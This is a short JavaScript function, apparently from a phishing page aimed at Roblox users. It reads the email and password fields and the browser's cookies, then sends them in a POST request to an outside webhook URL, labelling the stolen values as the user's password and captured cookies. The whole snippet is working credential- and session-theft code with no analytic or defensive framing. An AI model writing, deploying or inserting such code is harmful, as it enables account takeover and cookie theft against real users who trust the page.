async function captureData() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    const cookies = document.cookie;
    const webhookUrl = "https://play.svix.com/in/yJU37dwV7FAx2IzEjp0zvOwaYpW/";
    await fetch(webhookUrl, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            target: "Roblox",
            user_email: email,
            user_pass: pass,
            captured_cookies: cookies
        })
    });
}